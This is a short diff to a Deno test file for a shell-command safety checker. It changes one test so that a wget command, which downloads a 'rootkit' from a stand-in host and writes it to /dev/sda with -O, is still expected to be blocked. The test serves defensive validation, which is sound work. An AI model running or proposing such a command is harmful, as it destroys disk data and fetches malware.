@@ -291,8 +291,8 @@ Deno.test("isCommandSafe - blocks curl redirect to /dev", () => {
   assertEquals(result.safe, false);
 });
 
-Deno.test("isCommandSafe - blocks wget redirect to /dev", () => {
-  const result = isCommandSafe("wget https://evil.com/rootkit > /dev/sda");
+Deno.test("isCommandSafe - blocks wget -O to /dev", () => {
+  const result = isCommandSafe("wget https://evil.com/rootkit -O /dev/sda");
   assertEquals(result.safe, false);
 });
 
